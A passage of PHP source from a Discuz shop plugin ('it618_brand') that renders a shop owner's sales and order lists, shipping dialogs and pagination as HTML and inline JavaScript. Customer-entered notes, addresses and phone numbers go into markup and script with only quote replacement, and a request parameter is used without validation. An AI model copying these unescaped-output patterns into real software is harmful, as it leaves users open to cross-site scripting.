					$txcreditname=$_G['setting']['extcredits'][$it618_brand_sale['it618_txjfid']]['title'];
					$txstr=$it618_brand_lang['s1805'].'<br><font color="#F0F"><b>'.$it618_brand_sale['it618_txjfcount'].'</b></font> '.$txcreditname;
				}
			}
		}
		
		if(lang('plugin/it618_brand', $it618_brand_lang['it618'])!=$it618_brand_lang['version'])exit;
		
		if($isgoodsdel==0){
			$tmpurl=it618_brand_getrewrite('shop_product',$it618_brand_sale['it618_shopid'].'@'.$it618_brand_sale['it618_pid'],'plugin.php?id=it618_brand:product&sid='.$it618_brand_sale['it618_shopid'].'&pid='.$it618_brand_sale['it618_pid']);
			$goodsstr='<a href="'.$tmpurl.'" target="_blank" title="'.$goodsname.'">'.cutstr($goodsname, 36, '').'</a>';
		}else{
			$goodsstr=cutstr($goodsname, 36, '');
		}
		
		if($it618_brand_sale['it618_saletype']==2){
			$it618_salebz='';
			if($it618_brand_sale['it618_salebz']!=''){
				$it618_salebz='(<font color="red">'.strlen($it618_brand_sale['it618_salebz']).'</font>'.$it618_brand_lang['s1839'].')';
			}
			$it618_type.='<br><a href="javascript:" class="saleabtn" onclick="setsalebz('.$it618_brand_sale[id].')">'.$it618_brand_lang['s1834'].$it618_salebz.'</a>';
		}
		
		if($it618_brand_sale['it618_saletype']==3){
			$it618_state.='<br><a href="javascript:" class="saleabtn" onclick="setsalekm('.$it618_brand_sale['id'].')">'.it618_brand_getlang('s1244').'</a>';
		}
		
		$sale_get.='<tr class="hover">
		<td><input class="checkbox" type="checkbox" id="chk_del'.$it618_brand_sale[id].'" name="delete[]" value="'.$it618_brand_sale[id].'" '.$disabled.'><label for="chk_del'.$it618_brand_sale[id].'">'.$it618_brand_sale['id'].'</label></td>
		<td width="260">'.$goodsstr.'
		<br>'.$gtypename.'</td>
		<td>'.$it618_brand_sale['it618_count'].'</td>
		<td>'.$heji.'</td>
		<td>'.$it618_type.'</td>
		<td>'.$it618_state.'</td>
		<td>'.it618_brand_getlang('s1205').'<a href="'.it618_brand_rewriteurl($it618_brand_sale['it618_uid']).'" target="_blank">'.it618_brand_getusername($it618_brand_sale['it618_uid']).'</a><br>'.$strtmp.'</td>
		<td>'.$txstr.'<br><a href="javascript:" class="saleabtn" onclick="alert(\''.$it618_tc.'\')">'.$it618_brand_lang['s1797'].'</a></td>
		<td>'.date('Y-m-d H:i:s', $it618_brand_sale['it618_time']).'</td>
		</tr>';
		
		if($it618_brand_sale['it618_saletype']==2){
			$strcontent=str_replace("'","\"",$strcontent);
			$strcontent=str_replace(array("\r\n", "\r", "\n"),"",$strcontent);
			
			$tmpjs.='KindEditor.ready(function(K) {K(\'#fahuo'.$it618_brand_sale[id].'\').click(function() {
				dialog_kd = K.dialog({
					width : 660,
					height : 350,
					title : \''.it618_brand_getlang('s1191').'\',
					body : \'<div style="margin:10px;">'.$strcontent.'</div>\',
					closeBtn : {
						name : \''.it618_brand_getlang('s1207').'\',
						click : function(e) {
							dialog_kd.remove();
						}
					},
					noBtn : {
						name : \''.it618_brand_getlang('s1207').'\',
						click : function(e) {
							dialog_kd.remove();
						}
					}
				});
			});});';
		}
		
		if($it618_brand_sale['it618_bz']!=''){
			$it618_brand_sale['it618_bz']=str_replace("'","\"",$it618_brand_sale['it618_bz']);
			$it618_brand_sale['it618_bz']=str_replace(array("\r\n", "\r", "\n"),"",$it618_brand_sale['it618_bz']);
			
			$tmpjs.='KindEditor.ready(function(K) {K(\'#bz'.$it618_brand_sale[id].'\').click(function() {
				dialog_bz = K.dialog({
					width : 660,
					height : 350,
					title : \''.it618_brand_getlang('s1208').'\',
					body : \'<div style="margin:10px;">'.$it618_brand_sale['it618_bz'].'</div>\',
					closeBtn : {
						name : \''.it618_brand_getlang('s1207').'\',
						click : function(e) {
							dialog_bz.remove();
						}
					},
					noBtn : {
						name : \''.it618_brand_getlang('s1207').'\',
						click : function(e) {
							dialog_bz.remove();
						}
					}
				});
			});});';
		}
		
		if($tuistrcontent!=''){
			$tuistrcontent=str_replace("'","\"",$tuistrcontent);
			$tuistrcontent=str_replace(array("\r\n", "\r", "\n"),"",$tuistrcontent);
			
			$tmpjs.='KindEditor.ready(function(K) {K(\'#tui'.$it618_brand_sale[id].'\').click(function() {
				dialog_tui = K.dialog({
					width : 660,
					height : 350,
					title : \''.it618_brand_getlang('s1209').'\',
					body : \'<div style="margin:10px;">'.$tuistrcontent.'</div>\',
					closeBtn : {
						name : \''.it618_brand_getlang('s1207').'\',
						click : function(e) {
							dialog_tui.remove();
						}
					},
					noBtn : {
						name : \''.it618_brand_getlang('s1207').'\',
						click : function(e) {
							dialog_tui.remove();
						}
					}
				});
			});});';
		}
		}else{
			$strcontent='';
			$bz='';
			if($it618_brand_sale['it618_bz']!=""){
				$bz=' <a href="javascript:" class="saleabtn" onclick="bz'.$it618_brand_sale[id].'()">'.it618_brand_getlang('s1189').'</a> ';
				$strcontent.='<strong>'.it618_brand_getlang('s1190').'</strong><br>'.$it618_brand_sale['it618_bz'].'<br><br>';
			}
			
			$it618_statebtn='';$bzbtn='';$tuistrcontent='';$kdbtn='1';
			if($it618_brand_sale['it618_saletype']==2){
				if($it618_brand_sale['it618_state']==1){
					if($it618_brand_sale['it618_kddan']==''){
						if($it618_brand_sale['it618_state_tuihuo']!=1){
							$it618_statebtn='<a href="javascript:" class="saleabtn" onclick="fahuo'.$it618_brand_sale[id].'()">'.it618_brand_getlang('s1191').'</a>';
							$kdbtnname=it618_brand_getlang('s1192');
						}
					}else{
						$kdbtnname=it618_brand_getlang('s1193');
					}
					
					if($it618_brand_sale['it618_state_tuihuo']==1){
						$tuistrcontent=$it618_brand_sale['it618_content_tuihuo'];
						$it618_statebtn=''.it618_brand_getlang('s1196').' <a href="javascript:" class="saleabtn" onclick="tui'.$it618_brand_sale[id].'()">'.it618_brand_getlang('s1195').'</a><br><a href="javascript:" class="saleabtn" onclick="tongyitui('.$it618_brand_sale['id'].')">'.it618_brand_getlang('s1197').'</a> <a href="javascript:" class="saleabtn" onclick="jujuetui('.$it618_brand_sale['id'].')">'.it618_brand_getlang('s1198').'</a>';
					}
					if($it618_brand_sale['it618_state_tuihuo']==2){
						$it618_statebtn=''.it618_brand_getlang('s1197').'';
					}
					if($it618_brand_sale['it618_state_tuihuo']==3){
						$it618_statebtn=''.it618_brand_getlang('s1198').'';
					}
				}else{
					$kdbtnname=it618_brand_getlang('s1194');
					$kdbtn='';
				}
				if(lang('plugin/it618_brand', $it618_brand_lang['it618'])!=$it618_brand_lang['version'])exit;

				if($kdbtn!='')$kdbtn='<input type="button" style="background-color:#390;border:none;height:45px;font-size:15px;width:100%;color:#fff" value="'.$kdbtnname.'" onclick="savekd()">';
				
				$it618_kddan='';
				$it618_brand_kd=C::t('#it618_brand#it618_brand_kd')->fetch_by_id($it618_brand_sale['it618_kdid']);
				if($it618_brand_sale['it618_kddan']!=''){
					$it618_kddan='<br>'.it618_brand_getlang('s1159').'<span title="'.$it618_brand_sale['it618_bz'].'" style="color:green">'.$it618_brand_kd['it618_name'].' '.$it618_brand_sale['it618_kddan'].'</span> <a href="javascript:" class="saleabtn" onclick="fahuo'.$it618_brand_sale[id].'()">'.$kdbtnname.'</a>';
					
				}
				
				$tmp1=str_replace("<option value=".$it618_brand_kd['id'],"<option value=".$it618_brand_kd['id']." selected=selected",$tmp);
				
				$strcontent.='<div class="kd_fahuo"><table width="100%" style="margin-top:10px"><tr><td width=98><img src="'.it618_brand_getgoodspic($it618_brand_goods['it618_shopid'],$it618_brand_goods['id'],$it618_brand_goods['it618_picbig']).'" height="90" /></td><td style="vertical-align:top">'.$it618_brand_goods['it618_name'].' '.$gtypename.'</td></tr></table><br />'.$it618_brand_sale['it618_addr'].'<br><br>'.it618_brand_getlang('s1200').'<select id="it618_kdid">'.$tmp1.'</select><input type="text" id="it618_kddan" value="'.$it618_brand_sale['it618_kddan'].'"><input type="hidden" id="saleid" value="'.$it618_brand_sale['id'].'"><span style="color:red" id="kdtips"></span><br><br><font color=red>'.it618_brand_getlang('s1201').'</font></div>';
			}else{
				$it618_kddan='';
			}
			
			$strtel='';
			if($it618_brand_sale['it618_tel']!=""){
				$strtel=it618_brand_getlang('s1133').$it618_brand_sale['it618_tel'];
			}
			
			$strtmp=$strtel.$bz.$it618_kddan;
			if(lang('plugin/it618_brand', $it618_brand_lang['it618'])!=$it618_brand_lang['version'])exit;
			if($it618_brand_sale['it618_saletype']==1)$saletypestr=it618_brand_getlang('s1245');
			if($it618_brand_sale['it618_saletype']==2)$saletypestr=it618_brand_getlang('s1246');
			if($it618_brand_sale['it618_saletype']==3)$saletypestr=it618_brand_getlang('s1247');
			if($it618_brand_sale['it618_saletype']==5)$saletypestr=it618_brand_getlang('s1658');
			if($it618_brand_sale['it618_saletype']==6)$saletypestr=it618_brand_getlang('s857').' <font color=red>'.$it618_brand_sale['it618_prepaybl'].'</font>%';
			
			if($it618_brand_sale['it618_saletype']==6){
				$prepaybl=$it618_brand_sale['it618_prepaybl']/100;
			}else{
				$prepaybl=1;
			}
			
			if($it618_brand_sale['it618_type']==1){
				$it618_type=it618_brand_getlang('s1149').' '.$saletypestr;
				$hejimoney=$it618_brand_sale['it618_sfscore'];
				
				$zkstr='';	
				
				if($it618_brand_sale['it618_vipzk']>0){
					$zkstr.=' * '.$it618_brand_sale['it618_vipzk'].'%('.$it618_brand_lang['t798'].')';
				}
				
				$hejistr=$hejimoney.' '.$creditname.' = '.it618_brand_getlang('s921').($it618_brand_sale['it618_score']*$it618_brand_sale['it618_count']).$zkstr.' '.$creditname.' + '.it618_brand_getlang('s922').$it618_brand_sale['it618_yunfei'].' '.$creditname;
			
				$heji=$hejimoney.' '.$creditname.' <a href="javascript:" class="saleabtn" onclick="alert(\''.$hejistr.'\')">'.$it618_brand_lang['s1803'].'</a>';
				
				$it618_tc=it618_brand_getlang('s1210').$it618_brand_sale['it618_tcbl'].'% '.it618_brand_getlang('s1165').$it618_brand_sale['it618_tc'].' '.$creditname;
			}else{
				$it618_brand_money = C::t('#it618_brand#it618_brand_money')->fetch_by_saleid($it618_brand_sale['id']);
				if($it618_brand_sale['it618_gwcid']>0){
					$typestr=$it618_brand_lang['t192'].':<font color="#FF3300"><b>'.$it618_brand_sale['it618_gwcid'].'</b></font>';
				}else{
					$typestr=it618_brand_getlang('s1150');
				}
				$zsstr='';
				if($it618_brand_sale['it618_state']==2&&$it618_brand_money['it618_score']>0){
					$zsstr='<font color="green" title="'.it618_brand_getlang('s927').'">'.$it618_brand_sale['it618_alipaybl'].'%</font> <font color="green">'.$creditname.'-'.($it618_brand_money['it618_score']).'</font>';
				}
				$it618_type=''.$typestr.' '.$saletypestr.' '.$zsstr;
				$hejimoney=$it618_brand_sale['it618_sfmoney'];
				if($hejimoney<0)$hejimoney=0;
				if($hejimoney==0)$isdjq=1;
				$zkstr='';	
				if($it618_brand_sale['it618_zk']!=100){
					$zkstr=' * '.$it618_brand_sale['it618_zk'].'%('.$it618_brand_lang['t799'].')';
				}
				
				if($it618_brand_sale['it618_vipzk']>0){
					$zkstr.=' * '.$it618_brand_sale['it618_vipzk'].'%('.$it618_brand_lang['t798'].')';
				}
				
				$hejistr=$hejimoney.' '.it618_brand_getlang('s389').' = '.it618_brand_getlang('s921').($it618_brand_sale['it618_price']*$it618_brand_sale['it618_count']*$prepaybl).$zkstr.' '.it618_brand_getlang('s389').' + '.it618_brand_getlang('s922').$it618_brand_sale['it618_yunfei'].' '.it618_brand_getlang('s389').' - '.it618_brand_getlang('s928').$it618_brand_sale['it618_quanmoney'].' '.it618_brand_getlang('s389');
				
				$heji=$hejimoney.' '.it618_brand_getlang('s389').'<br><a href="javascript:" class="saleabtn" onclick="alert(\''.$hejistr.'\')">'.$it618_brand_lang['s1803'].'</a>';
				
				$it618_tc=it618_brand_getlang('s1210').$it618_brand_sale['it618_tcbl'].'% '.it618_brand_getlang('s1165').$it618_brand_sale['it618_tc'].' '.it618_brand_getlang('s389').'';
			}

			if($it618_brand_sale['it618_type']==2){
				$pricestr=$it618_brand_sale['it618_price'].' '.it618_brand_getlang('s389');
			}else{
				$pricestr=$it618_brand_sale['it618_score'].' '.$creditname;
			}
			
			$txstr='';
			if($it618_brand_sale['it618_state']==2){
				if($it618_brand_sale['it618_type']==1){
					$txstr='<font color="#F0F"><b>'.($hejimoney-$it618_brand_sale['it618_tc']).'</b></font> '.$creditname;
				}else{
					if($it618_brand_sale['it618_txtype']==1){
						$txstr=$it618_brand_lang['s1804'].' <font color="#F0F"><b>'.($hejimoney-$it618_brand_sale['it618_tc']).'</b></font> '.it618_brand_getlang('s389');
					}else{
						$txcreditname=$_G['setting']['extcredits'][$it618_brand_sale['it618_txjfid']]['title'];
						$txstr=$it618_brand_lang['s1805'].' <font color="#F0F"><b>'.$it618_brand_sale['it618_txjfcount'].'</b></font> '.$txcreditname;
					}
				}
			}
			
			if($it618_brand_sale['it618_saletype']==2){
				$it618_salebz='';
				if($it618_brand_sale['it618_salebz']!=''){
					$it618_salebz='(<font color="red">'.strlen($it618_brand_sale['it618_salebz']).'</font>'.$it618_brand_lang['s1839'].')';
				}
				$it618_type.=' <a href="javascript:" class="saleabtn" onclick="setsalebz('.$it618_brand_sale[id].')">'.$it618_brand_lang['s1834'].$it618_salebz.'</a>';
			}
			
			if($it618_brand_sale['it618_saletype']==3){
				$it618_type.='<a href="javascript:" style="float:right" onclick="setsalekm('.$it618_brand_sale['id'].')">'.it618_brand_getlang('s1244').'</a>';
			}
			
			if($isgoodsdel==0){
				$tmpurl=it618_brand_getrewrite('brand_wap','product@'.$it618_brand_sale['it618_shopid'].'@0@'.$it618_brand_sale['it618_pid'].'@0','plugin.php?id=it618_brand:wap&pagetype=product&sid='.$it618_brand_sale['it618_shopid'].'&cid='.$it618_brand_sale['it618_pid']);
				$goodsstr='<a href="'.$tmpurl.'" target="_blank" style="font-size:14px;color:#333">'.$goodsname.'</a>';
				$imgstr='<a href="'.$tmpurl.'" target="_blank"><img class="lazy" data-original="'.it618_brand_getgoodspic($it618_brand_goods['it618_shopid'],$it618_brand_goods['id'],$it618_brand_goods['it618_picbig']).'" width="108" height="108" style="border-radius: 3px;"/></a>';
			}else{
				$goodsstr='<span style="font-size:14px;color:#333">'.$goodsname.'</span>';
				$imgstr='<img src="source/plugin/it618_brand/images/nogoods.png" width="108" height="108" style="border-radius: 3px;"/>';
			}
			
			if($txstr!='')$txstr='<br>'.$txstr.'<a href="javascript:" class="saleabtn" onclick="alert(\''.$it618_tc.'\')">'.$it618_brand_lang['s1797'].'</a>';
			
			$sale_get.='<dd style="padding-bottom:10px; padding-top:13px;border-bottom:#f1f1f1 1px solid">
						<table width="100%">
							<tr><td width="118" style="text-align:left;vertical-align:top;border:none">
							'.$imgstr.'
							</td><td style="text-align:left;vertical-align:top;line-height:18px;border:none">
							'.$goodsstr.'<br>
							ID:'.$it618_brand_sale['id'].' '.$gtypename1.' '.it618_brand_getlang('s1164').''.$it618_brand_sale['it618_count'].'<br>'.$it618_type.'<br>'.it618_brand_getlang('s1165').$heji.' </span><br><div style="float:right;margin-top:-1px">'.''.it618_brand_getlang('s1167').''.$it618_state.'</div><font color=#ccc>'.date('Y-m-d H:i:s', $it618_brand_sale['it618_time']).'</font><br>'.$strtmp.' '.$it618_statebtn.''.$txstr.'
							</td></tr>
						</table>
					</dd>';
					
			if($it618_brand_sale['it618_saletype']==2){
				$tmpjs.='function fahuo'.$it618_brand_sale[id].'(){
							var layerobj = {
								title:"'.it618_brand_getlang('s1191').'",
								titlebgcolor:"#f9f9f9",
								content:\'<table width="98%"><tr><td>'.$strcontent.'</td></tr></table>\',
								bottom:\'<table width="100%"><tr><td>'.$kdbtn.'</td></tr></table>\',
								bottomheight:45,
								allcontent:""
							};
							
							showlayer("salefahuo",layerobj);
						}';
			}
			
			if($it618_brand_sale['it618_bz']!=''){
				$tmpjs.='function bz'.$it618_brand_sale[id].'(){
							var layerobj = {
								title:"'.it618_brand_getlang('s1208').'",
								titlebgcolor:"#f9f9f9",
								content:\'<table width="98%"><tr><td>'.$it618_brand_sale['it618_bz'].'</td></tr></table>\',
								bottom:"",
								bottomheight:0,
								allcontent:""
							};
							
							showlayer("salebz",layerobj);
						}';
			}
			
			if($tuistrcontent!=''){
				$tmpjs.='function tui'.$it618_brand_sale[id].'(){
							var layerobj = {
								title:"'.it618_brand_getlang('s1209').'",
								titlebgcolor:"#f9f9f9",
								content:\'<table width="98%"><tr><td>'.$tuistrcontent.'</td></tr></table>\',
								bottom:"",
								bottomheight:0,
								allcontent:""
							};
							
							showlayer("saletui",layerobj);
						}';
			}
		}

	}
	
	$money=C::t('#it618_brand#it618_brand_sale')->sum_it618_price_by_shopid($ShopId,"s.it618_type=2 ".$it618sql,'',$_GET['pname'],$_GET['finduid'], $_GET['it618_time1'], $_GET['it618_time2']);
	if($money=='')$money=0;
	$score=C::t('#it618_brand#it618_brand_sale')->sum_it618_score_by_shopid($ShopId,"s.it618_type=1 ".$it618sql,'',$_GET['pname'],$_GET['finduid'], $_GET['it618_time1'], $_GET['it618_time2']);
	$score1=C::t('#it618_brand#it618_brand_sale')->sum_it618_score1_by_shopid($ShopId,"s.it618_type=2 ".$it618sql,'',$_GET['pname'],$_GET['finduid'], $_GET['it618_time1'], $_GET['it618_time2']);
	if($score=='')$score=0;
	if($score1=='')$score1=0;
	$score=str_replace(".00","",$score);
	
	if($_GET['ac1']=='pcsale'){
		$multipage = multi($count, $ppp, $page, $_G['siteurl']."plugin.php?id=it618_brand:ajax");
		$multipage=str_replace("href=","name=",$multipage);
		$multipage=str_replace("name=","href='javascript:' onclick='".$funname."(this.name)' name=",$multipage);
		$multipage=str_replace("onclick='".$funname."(this.name)' ".'name="custompage"','',$multipage);
		$multipage=str_replace('window.location=',$funname.'(',$multipage);
		$multipage=str_replace('this.value;','this.value);',$multipage);
		
		$multipage='<td colspan=15><div class="cuspages right">'.$multipage.'</div><input type=hidden value='.$page.' name=page /></td>';
		
		$salesum= '<td colspan=15>'.it618_brand_getlang('s1168').''."<font color=red>$count</font> ".it618_brand_getlang('s1169')."<font color=red>$money</font> ".it618_brand_getlang('s389')." ".it618_brand_getlang('s1170')."<font color=red>$score</font> ".$creditname." ".it618_brand_getlang('s1171')."<font color=red>$score1</font> ".$creditname.'<span style="float:right">'.it618_brand_getlang('s1212').'</span></td>';
	}else{
		if($count<=$ppp){
			$pagecount=1;
		}else{
			$pagecount=ceil($count/$ppp);
		}
		
		if($pagecount>1){
			$n=1;
			while($n<=$pagecount){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_brand:ajax&page=".$n;
				if($page==$n)$tmpselect=' selected="selected"';else $tmpselect='';
				$curpage.='<option value="'.$tmpurl.'"'.$tmpselect.'>'.$n.'/'.$pagecount.'</option>';
				$n=$n+1;
			}
			$curpage='<select class="pageselect" onchange="'.$funname.'(this.value)">'.$curpage.'</select>';
			
			if($page==1){
				$pagepre='<a class="btn btn-weak btn-disabled" >'.it618_brand_getlang('s708').'</a>';
				if($pagecount>1){
					$tmpurl=$_G['siteurl']."plugin.php?id=it618_brand:ajax&page=2";
					$pagenext='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_brand_getlang('s709').'</a>';
				}else{
					$pagenext='<a class="btn btn-weak btn-disabled">'.it618_brand_getlang('s709').'</a>';
				}
			}elseif($page<$pagecount){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_brand:ajax&page=".($page-1);
				$pagepre='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_brand_getlang('s708').'</a>';
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_brand:ajax&page=".($page+1);
				$pagenext='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_brand_getlang('s709').'</a>';
			}else{
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_brand:ajax&page=".($page-1);
				$pagepre='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_brand_getlang('s708').'</a>';
				$pagenext='<a class="btn btn-weak btn-disabled" >'.it618_brand_getlang('s709').'</a>';
			}
			$multipage=$pagepre.' '.$curpage.' '.$pagenext;
			
		}
		$salesum= ''.it618_brand_getlang('s1168').''."<font color=red>$count</font> ".it618_brand_getlang('s1169')."<font color=red>$money</font> ".it618_brand_getlang('s389')." ".it618_brand_getlang('s1170')."<font color=red>$score</font> ".$creditname." ".it618_brand_getlang('s1171')."<font color=red>$score1</font> ".$creditname.' '.it618_brand_getlang('s1212');
	}
	
	echo $salesum.'it618_split'.$sale_get.'it618_split'.$multipage.'<script>'.$tmpjs.'</script>';
}


if($_GET['ac']=="order_get"){
	if(lang('plugin/it618_brand', $it618_brand_lang['it618'])!=$it618_brand_lang['version'])exit;
	if($_GET['state']) {
		if($_GET['state']==1)$it618sql .= "s.it618_state = 1";
		if($_GET['state']==2)$it618sql .= "s.it618_state = 2";
		if($_GET['state']==3)$it618sql .= "s.it618_state = 3";
		if($_GET['state']==4)$it618sql .= "s.it618_state = 4";
	}
	
	$ppp = 12;
	
	$count = C::t('#it618_brand#it618_brand_order')->count_by_search($ShopId,$it618sql,'',$_GET['pname'],$_GET['finduid'], $_GET['it618_time1'], $_GET['it618_time2']);
	$summoney = C::t('#it618_brand#it618_brand_order')->sum_money_by_search($ShopId,$it618sql,'',$_GET['pname'],$_GET['finduid'], $_GET['it618_time1'], $_GET['it618_time2']);
	
	$page = max(1, intval($_GET['page']));
	$startlimit = ($page - 1) * $ppp;
	$multipage = multi($count, $ppp, $page, "plugin.php?id=it618_brand:sc_order".$urlsql);
	
	$ordersum= '<td colspan=15>'.it618_brand_getlang('s1517').'<font color=red>'.$count.'</font> '.it618_brand_getlang('s1518').'<font color=red>'.$summoney.'</font> <span style="float:right;color:red">'.it618_brand_getlang('s1550').'</span></td>';
	
	
	$multipage = multi($count, $ppp, $page, $_G['siteurl']."plugin.php?id=it618_brand:ajax");
	$multipage=str_replace("href=","name=",$multipage);
	$multipage=str_replace("name=","href='javascript:' onclick='getorderlist(this.name)' name=",$multipage);
	$multipage=str_replace("onclick='getorderlist(this.name)' ".'name="custompage"','',$multipage);
	$multipage=str_replace('window.location=','getorderlist(',$multipage);
	$multipage=str_replace('this.value;;','this.value);',$multipage);
	
	$tmp='<option value="0">'.it618_brand_getlang('s1188').'</option>';
	foreach(C::t('#it618_brand#it618_brand_kd')->fetch_all_by_shopid($ShopId) as $it618_brand_kd) {
		$tmp.='<option value='.$it618_brand_kd['id'].'>'.$it618_brand_kd['it618_name'].'</option>';
	}
			
	foreach(C::t('#it618_brand#it618_brand_order')->fetch_all_by_search(
		$ShopId,$it618sql,'s.id desc',$_GET['pname'],$_GET['finduid'], $_GET['it618_time1'], $_GET['it618_time2'],$startlimit,$ppp
	) as $it618_brand_order) {
		
		$isgoodsdel=0;$gtypename='';$gtypename1='';
		if($it618_brand_goods = C::t('#it618_brand#it618_brand_goods')->fetch_by_id($it618_brand_order['it618_pid'])){
			$goodsname = $it618_brand_goods['it618_name'];
			$gtypename = C::t('#it618_brand#it618_brand_goods_type')->fetch_it618_name_by_id($it618_brand_order['it618_gtypeid']);
		}else{
			$isgoodsdel=1;
			$goodsname = $it618_brand_order['it618_pname'];
			$gtypename = $it618_brand_order['it618_gtypename'];
		}
		
		if($it618_brand_sale['it618_gtypeid']>0){
			$gtypename1='<span style="float:right">[<font color=red>'.$gtypename.'</font>]</span>';
			$gtypename='[<font color=red>'.$gtypename.'</font>]';
		}
		
		if($it618_brand_order['it618_state']==1)$it618_state='<font color=red>'.it618_brand_getlang('s1513').'</font>';
		if($it618_brand_order['it618_state']==2)$it618_state='<font color=blue>'.it618_brand_getlang('s1514').'</font>';
		if($it618_brand_order['it618_state']==3)$it618_state='<font color=green>'.it618_brand_getlang('s1515').'</font>';
		if($it618_brand_order['it618_state']==4)$it618_state='<font color=#F0F>'.it618_brand_getlang('s1516').'</font>';
		
		$bz='';$strcontent='';
		if($it618_brand_order['it618_bz']!=""){
			$bz=' <a href="javascript:" id="bz'.$it618_brand_order[id].'">'.it618_brand_getlang('s1523').'</a> ';
		}
		
		$bzbtn='';$kdbtn='1';
		
		if($it618_brand_order['it618_state']<=2){
			if($it618_brand_order['it618_kddan']==''){
				$it618_state.='<br><a href="javascript:" id="fahuo'.$it618_brand_order[id].'">'.it618_brand_getlang('s1524').'</a> <a href="javascript:" class="saleabtn" onclick="delorder('.$it618_brand_order[id].')">'.it618_brand_getlang('s1568').'</a>';
				$kdbtnname=it618_brand_getlang('s1527');
			}else{
				$kdbtnname=it618_brand_getlang('s1528');
			}
			
			if($it618_brand_order['it618_state']==2){
				$it618_state.='<br><a href="javascript:" class="saleabtn" onclick="okorder('.$it618_brand_order[id].',1)">'.it618_brand_getlang('s1525').'</a> <a href="javascript:" class="saleabtn" onclick="okorder('.$it618_brand_order[id].',0)">'.it618_brand_getlang('s1526').'</a>';	
			}
		}else{
			$kdbtnname=it618_brand_getlang('s1529');
			$kdbtn='';
		}
		
		if($kdbtn!='')$kdbtn='<input type="button" class="it618btn" value="'.$kdbtnname.'" onclick="savekd()">';
		if(lang('plugin/it618_brand', $it618_brand_lang['it618'])!=$it618_brand_lang['version'])exit;
		$it618_kddan='';
		if($it618_brand_order['it618_kddan']!=''){
			$it618_brand_kd=C::t('#it618_brand#it618_brand_kd')->fetch_by_id($it618_brand_order['it618_kdid']);
			$it618_kddan='<br>'.it618_brand_getlang('s1522').'<span title="'.$it618_brand_order['it618_bz'].'" style="color:green">'.$it618_brand_kd['it618_name'].' '.$it618_brand_order['it618_kddan'].'</span> <a href="javascript:" id="fahuo'.$it618_brand_order[id].'">'.$kdbtnname.'</a>';
			
		}
		
		$tmp1=str_replace("<option value=".$it618_brand_order['it618_kdid'],"<option value=".$it618_brand_order['it618_kdid']." selected=selected",$tmp);
		
		$strcontent.='<div class="kd_fahuo">'.$it618_brand_order['it618_addr'].'<br><br>'.it618_brand_getlang('s1530').'<select id="it618_kdid">'.$tmp1.'</select><input type="text" id="it618_kddan" value="'.$it618_brand_order['it618_kddan'].'"><input type="hidden" id="orderid" value="'.$it618_brand_order['id'].'"> '.$kdbtn.' <span style="color:red" id="kdtips"></span></div>';
		
		
		$strtel='';
		if($it618_brand_order['it618_tel']!=""){
			$strtel=it618_brand_getlang('s1539').$it618_brand_order['it618_tel'];
		}
		
		$strtmp=$strtel.$bz.$it618_kddan;
		
		if($isgoodsdel==0){
			$tmpurl=it618_brand_getrewrite('shop_product',$it618_brand_order['it618_shopid'].'@'.$it618_brand_order['it618_pid'],'plugin.php?id=it618_brand:product&sid='.$it618_brand_order['it618_shopid'].'&pid='.$it618_brand_order['it618_pid']);
			$goodsstr='<a href="'.$tmpurl.'" target="_blank">'.$goodsname.'</a>';
		}else{
			$goodsstr=$goodsname;
		}
		
		$order_get.='<tr class="hover">
		<td><input class="checkbox" type="checkbox" id="chk_del'.$it618_brand_order[id].'" name="delete[]" value="'.$it618_brand_order[id].'" '.$disabled.'><label for="chk_del'.$it618_brand_order[id].'">'.$it618_brand_order['id'].'</label></td>
		<td width="180">'.$goodsstr.' '.$gtypename.'</td>
		<td>'.it618_brand_getlang('s1536').$it618_brand_order['it618_price'].' '.it618_brand_getlang('s1532').$it618_brand_order['it618_count'].'<br>'.it618_brand_getlang('t687').':'.$it618_brand_order['it618_zk'].'% '.it618_brand_getlang('s1537').'<font color=red>'.$it618_brand_order['it618_price']*$it618_brand_order['it618_count'].'</font></td>
		<td>'.$it618_state.'</td>
		<td>'.$strtmp.'</td>
		<td><a href="'.it618_brand_rewriteurl($it618_brand_order['it618_uid']).'" target="_blank">'.it618_brand_getusername($it618_brand_order['it618_uid']).'</a></td>
		<td><div style="width:80px">'.date('Y-m-d H:i:s', $it618_brand_order['it618_time']).'<div></td>
		</tr>';
		
		$strcontent=str_replace("'","\"",$strcontent);
		$strcontent=str_replace(array("\r\n", "\r", "\n"),"",$strcontent);
	
		$tmpjs.='KindEditor.ready(function(K) {K(\'#fahuo'.$it618_brand_order[id].'\').click(function() {
			dialog_fahuo = K.dialog({
				width : 660,
				height : 350,
				title : \''.it618_brand_getlang('s1540').'\',
				body : \'<div style="margin:10px;">'.$strcontent.'</div>\',
				closeBtn : {
					name : \''.it618_brand_getlang('s1207').'\',
					click : function(e) {
						dialog_fahuo.remove();
					}
				},
				noBtn : {
					name : \''.it618_brand_getlang('s1207').'\',
					click : function(e) {
						dialog_fahuo.remove();
					}
				}
			});
		});});';
		
		if($it618_brand_order['it618_bz']!=''){
			$it618_brand_order['it618_bz']=str_replace("'","\"",$it618_brand_order['it618_bz']);
			$it618_brand_order['it618_bz']=str_replace(array("\r\n", "\r", "\n"),"",$it618_brand_order['it618_bz']);
			
			$tmpjs.='KindEditor.ready(function(K) {K(\'#bz'.$it618_brand_order[id].'\').click(function() {
				dialog_bz = K.dialog({
					width : 660,
					height : 350,
					title : \''.it618_brand_getlang('s1541').'\',
					body : \'<div style="margin:10px;">'.$it618_brand_order['it618_bz'].'</div>\',
					closeBtn : {
						name : \''.it618_brand_getlang('s1207').'\',
						click : function(e) {
							dialog_bz.remove();
						}
					},
					noBtn : {
						name : \''.it618_brand_getlang('s1207').'\',
						click : function(e) {
							dialog_bz.remove();
						}
					}
				});
			});});';
		}
	}
	
	$multipage='<td colspan=15><div class="cuspages right">'.$multipage.'</div><input type=hidden value='.$page.' name=page /><script>'.$tmpjs.'</script></td>';
	
	echo $ordersum.'it618_split'.$order_get.'it618_split'.$multipage;
}



if($_GET['ac']=="delorder"){
	$orderid=$_GET['orderid'];
	$it618_brand_order=C::t('#it618_brand#it618_brand_order')->fetch_by_id($orderid);
